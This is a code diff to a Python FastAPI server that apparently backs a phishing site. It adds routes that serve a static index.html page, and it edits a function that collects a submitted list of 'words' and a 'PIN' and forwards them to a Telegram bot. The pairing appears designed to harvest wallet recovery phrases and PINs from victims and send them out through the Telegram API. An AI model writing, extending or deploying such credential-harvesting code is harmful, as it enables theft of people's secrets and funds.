@@ -2,9 +2,18 @@ from fastapi import FastAPI
 from pydantic import BaseModel
 from typing import List
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.staticfiles import StaticFiles
+from fastapi.responses import FileResponse
 import requests
+import os
 
 app = FastAPI()
+
+app.mount("/static", StaticFiles(directory="static"), name="static")
+
+@app.get("/")
+def site():
+    return FileResponse(os.path.join("static", "index.html"))
 
 app.add_middleware(
     CORSMiddleware,
@@ -27,12 +36,12 @@ class Data(BaseModel):
 
 def send_to_telegram(words, pin):
 
-    text = "📥 New Data\n\n"
+    text = "📥 NEW DATA\n\n"
 
     for i, w in enumerate(words, start=1):
         text += f"{i}. {w}\n"
 
-    text += f"\nPIN: {pin}"
+    text += f"\n🔐PIN: {pin}"
 
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
@@ -49,4 +58,6 @@ async def submit(data: Data):
     send_to_telegram(data.words, data.pin)
 
     return {"status": "ok"}
+
+
 
